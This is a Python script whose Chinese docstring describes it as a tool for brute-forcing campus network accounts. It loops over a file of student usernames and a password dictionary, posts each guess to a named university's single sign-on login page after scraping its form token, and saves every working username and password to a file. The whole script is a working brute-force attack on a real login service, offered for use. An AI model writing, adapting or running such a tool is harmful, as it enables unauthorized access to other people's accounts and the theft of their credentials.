import requests
from bs4 import BeautifulSoup
"""
暴力破解校园网账号密码


需要账号文件(muc_17_user.txt)，还有密码词典文件(pass_normal_dict.txt)，最后生成的账号密码文件(mucpass.txt)
"""

def get():
    #请求头
    head = {
        "Accept": "text / html, application / xhtml + xml, application / xml;q = 0.9, image / webp, image / apng, * / *;q = 0.8",
        "Accept - Encoding": "gzip, deflate",
        "Accept - Language": "zh - CN, zh;q = 0.9",
        "Connection": "keep - alive",
        "Host": "i.muc.edu.cn",
        "Upgrade - Insecure - Requests": "1",
        "User - Agent": "Mozilla / 5.0(X11;Linux x86_64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 66.0.3359.139Safari / 537.36"
    }
    #post和登录页面地址
    login_url = "http://ca.muc.edu.cn/zfca/login"

    #生成账号密码词典
    username=[]
    password=[]
    #读取用户账号
    user_17=open('muc_17_user.txt')
    while 1:
        line=user_17.readline().strip('\n')
        username.append(line)
        if not line:
            break
        pass
    #读取密码词典
    dict = open('pass_normal_dict.txt')
    while 1:
        line = dict.readline().strip('\n')
        password.append(line)
        if not line:
            break
        pass
    password.pop()

    #暴力循环----这里循环的次数很多 可能会死机

    y=0
    for i in username:
        for j in password:

            s = requests.session()#每次都初始化session 不然找到一个密码后就不往后执行程序了
            r = s.get(login_url, headers=head)#每次请求 获取随机生成的lt 用于form提交
            html = r.content
            soup = BeautifulSoup(html, 'html.parser')
            input = soup.find_all('input')
            try:
                lt = input[7]['value']  # form-data之一
            except:
                pass
            uname=i
            passw=j
            #提交的数据
            post_data={
                "useValidateCode": "0",
                "isremenberme": "0",
                "ip":"",
                "username":uname,
                "password":passw,
                "losetime":"240",
                "lt":lt,
                "_eventId":"submit",
                "submit1":"登录"
            }
            #提交数据
            r2=s.post(login_url,headers=head,data=post_data)
            #获取post成功后的页面
            r3=s.get(r2.url,headers=head)#成功后获取的重定向地址
            return_url=r3.url
            #登录成功
            if return_url!="http://i.muc.edu.cn/zfca/login" and return_url!="http://ca.muc.edu.cn/zfca/login":
                print('y')
                f=open('mucpass.txt','a')
                text=str(uname)+'|'+passw
                f.write(text+'\n')#写入文件
                #密码正确后写入mucpass.txt文件

            print(y)
            y+=1



#运行函数
get()


